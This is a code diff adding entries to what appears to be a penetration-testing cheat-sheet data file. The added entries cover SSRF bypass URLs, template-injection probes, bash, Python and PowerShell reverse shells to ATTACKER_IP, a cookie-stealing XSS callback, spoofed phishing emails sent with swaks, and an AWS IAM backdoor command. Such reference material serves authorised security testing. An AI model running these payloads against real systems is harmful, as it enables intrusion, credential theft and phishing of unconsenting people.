@@ -741,9 +741,20 @@ export const tools: Tool[] = [
         name: 'Automation',
         commands: [
           { label: 'Interactsh callback', cmd: 'interactsh-client -o ssrf-callbacks.txt' },
+          { label: 'Interactsh web', cmd: 'https://app.interactsh.com/' },
+          { label: 'Webhook.site', cmd: 'https://webhook.site/' },
           { label: 'ffuf internal ports', cmd: 'ffuf -u "https://TARGET/fetch?url=http://127.0.0.1:FUZZ/" -w ports.txt -fs SIZE' },
           { label: 'Gopherus payloads', cmd: 'gopherus --exploit redis' },
           { label: 'SSRFmap', cmd: 'python3 ssrfmap.py -r request.txt -p url -m portscan' },
+        ],
+      },
+      {
+        name: 'URL Bypass',
+        commands: [
+          { label: 'Userinfo bypass', cmd: 'https://allowed.com@127.0.0.1/' },
+          { label: 'Fragment bypass', cmd: 'https://127.0.0.1#allowed.com' },
+          { label: 'DNS rebinding helper', cmd: 'http://localtest.me/' },
+          { label: 'nip.io internal host', cmd: 'http://127.0.0.1.nip.io/' },
         ],
       },
     ],
@@ -771,6 +782,15 @@ export const tools: Tool[] = [
           { label: 'POST test', cmd: 'tplmap -u https://TARGET/render -d "name=test"' },
           { label: 'OS command', cmd: 'tplmap -u "https://TARGET/page?name=test" --os-cmd id' },
           { label: 'Interactive shell', cmd: 'tplmap -u "https://TARGET/page?name=test" --os-shell' },
+        ],
+      },
+      {
+        name: 'Payload Notes',
+        commands: [
+          { label: 'Jinja2 class chain probe', cmd: '{{[].__class__.__base__.__subclasses__()}}' },
+          { label: 'Twig command probe', cmd: '{{["id"]|filter("system")}}' },
+          { label: 'HackTricks SSTI', cmd: 'https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html' },
+          { label: 'PayloadsAllTheThings SSTI', cmd: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection' },
         ],
       },
     ],
@@ -807,6 +827,15 @@ export const tools: Tool[] = [
           { label: 'IFS instead space', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;cat${IFS}/etc/passwd"' },
           { label: 'Brace expansion', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1;{cat,/etc/passwd}"' },
           { label: 'Tab encoded', cmd: 'curl -k "https://TARGET/ping?host=127.0.0.1%0abash%09-c%09id"' },
+        ],
+      },
+      {
+        name: 'Shell Helpers',
+        commands: [
+          { label: 'revshells.com', cmd: 'https://www.revshells.com/' },
+          { label: 'Bash reverse shell', cmd: 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"' },
+          { label: 'Python reverse shell', cmd: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'' },
+          { label: 'PowerShell reverse shell', cmd: 'powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient(\'ATTACKER_IP\',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"' },
         ],
       },
     ],
@@ -1427,6 +1456,15 @@ export const tools: Tool[] = [
           { label: 'Blind XSS', cmd: 'dalfox url "https://TARGET/page?q=1" -b "https://YOUR_BLIND_XSS_SERVER"' },
         ],
       },
+      {
+        name: 'Online / OOB',
+        commands: [
+          { label: 'xss.report dashboard', cmd: 'https://xss.report/dashboard' },
+          { label: 'Blind XSS payload', cmd: '<script src="https://YOUR-SUBDOMAIN.xss.ht"></script>' },
+          { label: 'Image callback', cmd: '<img src=x onerror="fetch(\'https://YOUR-CALLBACK/?c=\'+document.cookie)">' },
+          { label: 'Webhook.site callback', cmd: 'https://webhook.site/' },
+        ],
+      },
     ],
   },
   {
@@ -1462,6 +1500,16 @@ export const tools: Tool[] = [
           { label: 'Stack two zips', cmd: 'cat benign.zip evil.zip > combined.zip' },
           { label: 'List unzip view', cmd: 'unzip -l combined.zip' },
           { label: 'Zip bomb check', cmd: 'dd if=/dev/zero bs=1M count=10 | zip -9 bomb.zip -' },
+        ],
+      },
+      {
+        name: 'File Checks',
+        commands: [
+          { label: 'Magic bytes', cmd: 'xxd -l 32 upload.bin' },
+          { label: 'Detect file type', cmd: 'file upload.bin' },
+          { label: 'Exif metadata', cmd: 'exiftool upload.jpg' },
+          { label: 'Strip metadata', cmd: 'exiftool -all= upload.jpg' },
+          { label: 'ImageMagick identify', cmd: 'identify -verbose upload.jpg' },
         ],
       },
     ],
@@ -1554,12 +1602,142 @@ export const tools: Tool[] = [
           { label: 'None alg test', cmd: 'jwt_tool TOKEN -X a' },
           { label: 'Weak secret crack', cmd: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt' },
           { label: 'JWKS endpoint', cmd: 'curl -k https://TARGET/.well-known/jwks.json' },
+          { label: 'token.dev online', cmd: 'https://token.dev/' },
+          { label: 'jwt.io debugger', cmd: 'https://jwt.io/' },
+          { label: 'Burp JWT Editor', cmd: 'https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61' },
+          { label: 'Extract bearer token', cmd: 'grep -Eo "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+" request.txt' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'web-online-platforms',
+    name: 'Web Online Platforms',
+    tags: ['recon', 'web', 'online', 'jwt', 'xss', 'shell', 'stego'],
+    description: 'Browser-based helpers for JWT, XSS callbacks, reverse shells, stego and code cleanup',
+    categories: [
+      {
+        name: 'JWT / Tokens',
+        commands: [
+          { label: 'token.dev', cmd: 'https://token.dev/' },
+          { label: 'jwt.io debugger', cmd: 'https://jwt.io/' },
+          { label: 'JSON Web Key generator', cmd: 'https://mkjwk.org/' },
+          { label: 'CyberChef JWT decode', cmd: 'https://gchq.github.io/CyberChef/#recipe=JWT_Decode()' },
+        ],
+      },
+      {
+        name: 'XSS / Callbacks',
+        commands: [
+          { label: 'xss.report dashboard', cmd: 'https://xss.report/dashboard' },
+          { label: 'Webhook.site', cmd: 'https://webhook.site/' },
+          { label: 'Interactsh web', cmd: 'https://app.interactsh.com/' },
+          { label: 'RequestBin style collector', cmd: 'https://pipedream.com/requestbin' },
+        ],
+      },
+      {
+        name: 'Shells',
+        commands: [
+          { label: 'Reverse Shell Generator', cmd: 'https://www.revshells.com/' },
+          { label: 'PentestMonkey reverse shells', cmd: 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet' },
+          { label: 'GTFOBins', cmd: 'https://gtfobins.github.io/' },
+          { label: 'LOLBAS', cmd: 'https://lolbas-project.github.io/' },
+        ],
+      },
+      {
+        name: 'Stego / Files',
+        commands: [
+          { label: 'StegOnline upload', cmd: 'https://georgeom.net/StegOnline/upload' },
+          { label: 'AperiSolve', cmd: 'https://www.aperisolve.com/' },
+          { label: 'Exif viewer', cmd: 'https://exif.tools/' },
+          { label: 'File signature DB', cmd: 'https://www.garykessler.net/library/file_sigs.html' },
+        ],
+      },
+      {
+        name: 'Decode / Beautify',
+        commands: [
+          { label: 'Beautifier.io', cmd: 'https://beautifier.io/' },
+          { label: 'CyberChef', cmd: 'https://gchq.github.io/CyberChef/' },
+          { label: 'JS Nice', cmd: 'http://jsnice.org/' },
+          { label: 'de4js', cmd: 'https://lelinhtinh.github.io/de4js/' },
         ],
       },
     ],
   },
 
   // ─── SEARCHSPLOIT ──────────────────────────────────────────────
+  {
+    id: 'gitleaks',
+    name: 'gitleaks / trufflehog',
+    tags: ['recon', 'osint'],
+    description: 'Secret scanning in Git repos, filesystems and containers',
+    categories: [
+      {
+        name: 'gitleaks',
+        commands: [
+          { label: 'Scan local repo', cmd: 'gitleaks detect --source /path/to/repo -v' },
+          { label: 'Scan full git history', cmd: 'gitleaks detect --source /path/to/repo --log-opts="--all"' },
+          { label: 'Scan recent commits', cmd: 'gitleaks detect --source . --log-opts HEAD~5..HEAD' },
+          { label: 'JSON report', cmd: 'gitleaks detect --source /path/to/repo --report-path findings.json' },
+        ],
+      },
+      {
+        name: 'trufflehog',
+        commands: [
+          { label: 'Scan GitHub repo', cmd: 'trufflehog git https://github.com/USER/REPO' },
+          { label: 'Scan filesystem', cmd: 'trufflehog filesystem /path/to/repo' },
+          { label: 'Scan Docker image', cmd: 'trufflehog docker --image IMAGE_NAME' },
+          { label: 'Only verified', cmd: 'trufflehog git https://github.com/USER/REPO --only-verified' },
+        ],
+      },
+      {
+        name: 'Git Dumper',
+        commands: [
+          { label: 'Dump exposed .git', cmd: 'git-dumper https://TARGET/.git/ ./dumped-repo' },
+          { label: 'Restore working tree', cmd: 'cd dumped-repo && git checkout -- .' },
+          { label: 'View git log', cmd: 'cd dumped-repo && git log --oneline' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'swaks',
+    name: 'swaks',
+    tags: ['exploitation', 'network', 'enumeration'],
+    description: 'SMTP testing tool for relay checks, auth and message crafting',
+    categories: [
+      {
+        name: 'Email Tests',
+        commands: [
+          { label: 'Basic email', cmd: 'swaks --to target@domain.com --from attacker@evil.com --server smtp.TARGET.com' },
+          { label: 'Custom subject/body', cmd: 'swaks --to victim@company.com --from "IT Support <it@company.com>" --header "Subject: Password Reset" --body "Click here: http://EVIL_IP/reset" --server SMTP_IP' },
+          { label: 'Attachment', cmd: 'swaks --to victim@company.com --from spoofed@company.com --attach @payload.doc --server SMTP_IP' },
+          { label: 'Open relay test', cmd: 'swaks --to external@gmail.com --from internal@TARGET.com --server SMTP_IP' },
+          { label: 'AUTH LOGIN', cmd: 'swaks --to target@domain.com --server SMTP_IP --auth LOGIN --auth-user USER --auth-password PASS' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'pacu',
+    name: 'PACU',
+    tags: ['exploitation', 'recon', 'cloud'],
+    description: 'AWS exploitation framework for IAM enumeration, privilege escalation and persistence',
+    categories: [
+      {
+        name: 'Usage',
+        commands: [
+          { label: 'Start shell', cmd: 'python3 pacu.py' },
+          { label: 'Set keys', cmd: 'set_keys' },
+          { label: 'IAM permissions enum', cmd: 'run iam__enum_permissions' },
+          { label: 'IAM bruteforce permissions', cmd: 'run iam__bruteforce_permissions' },
+          { label: 'Privilege escalation scan', cmd: 'run iam__privesc_scan' },
+          { label: 'Enumerate EC2', cmd: 'run ec2__enum' },
+          { label: 'Enumerate S3 buckets', cmd: 'run s3__enum' },
+          { label: 'IAM backdoor role', cmd: 'run iam__backdoor_assume_role' },
+        ],
+      },
+    ],
+  },
   {
     id: 'searchsploit',
     name: 'searchsploit',
